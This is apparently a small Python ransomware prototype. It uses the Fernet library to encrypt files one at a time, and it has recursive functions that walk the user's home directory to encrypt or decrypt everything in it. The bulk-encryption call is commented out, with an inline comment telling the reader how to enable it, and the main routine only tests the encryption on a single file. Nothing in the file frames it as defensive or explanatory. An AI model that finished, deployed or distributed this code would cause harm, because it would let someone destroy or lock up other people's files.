from cryptography.fernet import Fernet
import os, re

def encrypt_users(path):
    for files in os.listdir(path):
        if os.path.isdir(path + "\\" + files):
            encrypt_users(path + "\\" + files)
        else:
            #encrypt_file(path + "\\" + files) 
            pass #remove this and uncomment the call to encrypt_file to make this work.

def encrypt_file(path):
    with open((os.path.expanduser("~") + "\\key.txt"), "rb") as file:
        key = file.read()
    fernet = Fernet(key)
    with open(path) as file:
        original = bytes(file.read(), "utf-8")
    encrypted = fernet.encrypt(original)
    with open(path, "wb") as file:
        file.write(encrypted)

def decrypt_file(path):
    with open((os.path.expanduser("~") + "\\key.txt"), "rb") as file:
        key = file.read()
    fernet = Fernet(key)
    with open(path) as file:
        encrypted = file.read()
    original = fernet.decrypt(encrypted)
    with open(path, "w") as file:
        file.write(original.decode())

def decrypt_users(path):
    for files in os.listdir(path):
        if os.path.isdir(path + "\\" + files):
            decrypt_users(path + "\\" + files)
        else:
            #decrypt_file(path + "\\" + files) 
            pass #remove this and uncomment the call to encrypt_file to make this work.

def generate_key():
    key = Fernet.generate_key()
    with open((os.path.expanduser("~") + "\\key.txt"), "wb") as file:
        file.write(key)

def main():
    #print(os.listdir(os.path.expanduser("~")))
    #encrypt_users(os.path.expanduser("~"))
    generate_key()
    encrypt_file("bob.txt")
    decrypt_file("bob.txt")

if __name__ == "__main__":
    main()